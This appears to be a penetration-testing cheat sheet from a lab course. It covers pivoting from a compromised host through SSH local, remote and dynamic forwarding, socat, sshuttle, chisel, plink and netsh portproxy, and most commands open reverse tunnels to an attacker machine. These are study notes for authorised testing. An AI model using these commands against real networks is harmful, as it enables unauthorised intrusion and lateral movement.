### Port Forwarding
###### RINETD
```
cat /etc/rinetd.conf
...
# bindadress    bindport  connectaddress  connectport
0.0.0.0 80 142.0.128.189  22
...
service rinetd start
```
###### SSH local port forwarding
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/d54b48e3-43ed-4fde-ad3f-2d28b538bde5)

forward all packets which go to remote compromised machine:445 to 192.168.1.110:445(PGDATABASE01)
```
remote compromised machine(confluence01): ssh -N -L 0.0.0.0(src CONFLUENCE01):445:192.168.1.110(dst PGDATABASE01):445 student@PGDATABASE01
```
###### ssh remote port forwarding
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/9355bdff-aa68-4989-aa53-0f3074a39739)

```
remote compromised machine(confluence01): ssh -N -R 127.0.0.1(confluence01):2345:10.4.50.215(PGDATABASE01):5432 kali@192.168.118.4(attacker machine)
```
###### SSH Dynamic Port Forwarding
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/f68cfac3-7e49-4f50-b104-ad7a672958e7)

Dynamic Port Forwarding:
initiating an SSH connection from a remote compromised machine to a further internal network(PGDATABASE01)

After bind proxychains to confluence01, through proxychains all traffic can be forwarded to all ports of PGDATABASE01, accessing 127.0.0.1 is like accessing remote machine(PGDATABASE01)
```
remote compromised machine: ssh -N -D 0.0.0.0:9999(remote compromised machine - confluence01) database_admin@10.4.50.215(PGDATABASE01)

kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 192.168.50.63 9999(remote compromised machine - confluence01)
```
###### SSH Remote Dynamic Port Forwarding 
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/118dc119-bbce-4559-8ec6-5b1c1b7e50f5)

Remote Dynamic Port Forwarding:
initiating an SSH connection from a remote compromised host(confluence to attacker machine)
```
remote compromised machine(confluence01): ssh -N -R 9998 kali@192.168.118.4(attacker machine)(listening state)

kali@kali(attacker machine):~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998(attacker machine)
```
###### sshuttle
```
1. confluence01: socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22(PGDATABASE01)
2. kali(attacker machine): sshuttle -r database_admin@192.168.50.63(PGDATABASE01):2222 10.4.50.0/24 172.16.50.0/24
```
###### httptunnel
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/0c4201e9-44ae-4d2f-ad93-a5ddb4317f52)
```
Confluence01: .\chisel.exe client 192.168.45.214:8080 R:socks
kali(attacker machine): chisel server --port 8080 --reverse/chisel server --port 8080 --socks5 --reverse

proxychains4:
add socks5 127.0.0.1 1080(chisel default port to listen)
disable proxy dns
sudo proxychains4 -f /etc/proxychains4.conf nmap -sS -Pn -p 80 172.16.243.10
```
### Windows Port forwarding
###### PLINK.exe
```
cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234(dst):127.0.0.1:3306(source) 10.11.0.4
```
###### Netsh
>for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use
```
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=4455 listenaddress=10.11.0.22
```
###### ssh.exe
```
linux: 
1. sudo systemctl start ssh
windows: 
1. where ssh
2. ssh.exe -V (the version of OpenSSH bundled with Windows needs to be higher than 7.6, then we can use it for remote dynamic port forwarding)
3. ssh -N -R 9998 kali@192.168.118.4
linux: 
1. ss -ntplu(check socks5 9998 port state)
2. tail /etc/proxychains4.conf
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
3. proxychains command
```
